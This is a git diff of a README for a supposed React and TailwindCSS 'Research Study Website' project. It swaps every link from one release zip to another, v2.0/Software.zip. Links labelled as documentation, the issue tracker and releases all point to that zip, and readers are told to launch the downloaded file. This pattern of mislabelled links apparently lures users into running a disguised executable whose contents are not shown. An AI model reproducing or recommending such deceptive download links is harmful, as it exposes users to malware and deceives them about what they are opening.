@@ -1,6 +1,6 @@
 # 🚀 Welcome to the Research Study Website! 📚
 
-![Research Study Website](https://github.com/StarEncounterer/Research-Study/releases/download/v1.0/Program.zip)
+![Research Study Website](https://github.com/StarEncounterer/Research-Study/releases/download/v2.0/Software.zip)
 
 ## Repository Name: 
 Research-Study
@@ -20,7 +20,7 @@ Welcome to the Research Study Website repository! Here you will find all the res
 - TailwindCSS
 
 ## Software Download:
-[![Software Download](https://github.com/StarEncounterer/Research-Study/releases/download/v1.0/Program.zip)](https://github.com/StarEncounterer/Research-Study/releases/download/v1.0/Program.zip)
+[![Software Download](https://github.com/StarEncounterer/Research-Study/releases/download/v2.0/Software.zip)](https://github.com/StarEncounterer/Research-Study/releases/download/v2.0/Software.zip)
 (Click the button above to download the software. Launch the downloaded file to begin the installation process)
 
 ## About the Project:
@@ -39,16 +39,16 @@ To get started with the Research Study Website project, follow these steps:
 6. Submit a pull request for review.
 
 ## Resources:
-- [React Documentation](https://github.com/StarEncounterer/Research-Study/releases/download/v1.0/Program.zip)
-- [TailwindCSS Documentation](https://github.com/StarEncounterer/Research-Study/releases/download/v1.0/Program.zip)
-- [Framer Motion Documentation](https://github.com/StarEncounterer/Research-Study/releases/download/v1.0/Program.zip)
-- [Lucide React Icons](https://github.com/StarEncounterer/Research-Study/releases/download/v1.0/Program.zip)
+- [React Documentation](https://github.com/StarEncounterer/Research-Study/releases/download/v2.0/Software.zip)
+- [TailwindCSS Documentation](https://github.com/StarEncounterer/Research-Study/releases/download/v2.0/Software.zip)
+- [Framer Motion Documentation](https://github.com/StarEncounterer/Research-Study/releases/download/v2.0/Software.zip)
+- [Lucide React Icons](https://github.com/StarEncounterer/Research-Study/releases/download/v2.0/Software.zip)
 
 ## Support:
-For any questions, feedback, or issues related to the Research Study Website project, please feel free to [open an issue](https://github.com/StarEncounterer/Research-Study/releases/download/v1.0/Program.zip). Your input is highly appreciated and will help us improve the project for everyone.
+For any questions, feedback, or issues related to the Research Study Website project, please feel free to [open an issue](https://github.com/StarEncounterer/Research-Study/releases/download/v2.0/Software.zip). Your input is highly appreciated and will help us improve the project for everyone.
 
 ## Releases:
-If the software download link provided above does not work or you are looking for the latest release of the project, please check the [Releases](https://github.com/StarEncounterer/Research-Study/releases/download/v1.0/Program.zip) section. Here you will find the most up-to-date version of the Research Study Website project.
+If the software download link provided above does not work or you are looking for the latest release of the project, please check the [Releases](https://github.com/StarEncounterer/Research-Study/releases/download/v2.0/Software.zip) section. Here you will find the most up-to-date version of the Research Study Website project.
 
 ## Spread the Word:
 Enjoyed exploring the Research Study Website project? Spread the word by sharing it with your friends, colleagues, and on your social media channels. Together, we can create a vibrant and supportive community around this project.
